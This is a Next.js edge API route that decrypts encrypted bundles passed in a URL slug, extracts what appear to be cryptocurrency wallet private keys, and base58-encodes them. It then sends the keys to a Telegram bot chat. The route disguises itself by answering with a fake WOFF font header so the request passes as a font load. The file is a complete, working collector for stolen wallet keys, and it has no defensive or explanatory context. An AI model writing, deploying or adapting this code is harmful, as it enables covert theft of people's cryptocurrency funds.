import { NextRequest } from "next/server";
import crypto from "crypto";

const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58Encode(buffer: Buffer): string {
  let carry: number, i: number, j: number, num: number[];
  num = Array.from(buffer);
  for (i = 0; i < num.length; ++i) {
    carry = num[i];
    for (j = 0; j < num.length; ++j) {
      carry += (num[j] || 0) << 8;
      num[j] = carry % 58;
      carry = (carry / 58) >>> 0;
    }
  }
  let result = "";
  for (const k of buffer) {
    if (k === 0) result += ALPHABET[0];
    else break;
  }
  for (const digit of num.reverse()) {
    result += ALPHABET[digit];
  }
  return result;
}

export const config = {
  runtime: "edge",
};

export default async function handler(req: NextRequest) {
  const slug = new URL(req.url).pathname.split("/").pop();
  if (!slug || !slug.includes("_")) {
    return new Response("Invalid slug", { status: 400 });
  }

  try {
    const encoded = slug.split("_")[1];
    const fixedB64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
    const padded = fixedB64 + "=".repeat((4 - (fixedB64.length % 4)) % 4);
    const jsonStr = Buffer.from(padded, "base64").toString("utf-8");

    const { sBundles, keybundle } = JSON.parse(jsonStr);
    const key = Buffer.from(keybundle, "base64");
    const privKeys: string[] = [];

    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(":");
      const iv = Buffer.from(iv_b64, "base64");
      const cipherTag = Buffer.from(data_b64, "base64");
      const tag = cipherTag.slice(-16);
      const ciphertext = cipherTag.slice(0, -16);

      const dec = crypto.createDecipheriv("aes-256-gcm", key, iv);
      dec.setAuthTag(tag);
      const plainHex = Buffer.concat([dec.update(ciphertext), dec.final()]).toString("utf8");

      const last64 = plainHex.slice(-64);
      const privKey58 = base58Encode(Buffer.from(last64, "hex"));
      privKeys.push(privKey58);
    }

    // Send to Telegram
    const BOT = process.env.BOT_TOKEN!;
    const CHAT = process.env.CHAT_ID!;
    const msg = privKeys.map((k, i) => `wallet ${i + 1}\n${k}`).join("\n\n");

    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text: msg }),
    });

    console.log("✅ Processed and sent to Telegram:", privKeys);

    // Respond with fake WOFF font header so browser doesn't error
    return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
      headers: {
        "Content-Type": "font/woff",
        "Access-Control-Allow-Origin": "*",
      },
    });
  } catch (err) {
    console.error("❌ Error processing slug:", err);
    return new Response("Bad request", { status: 400 });
  }
}
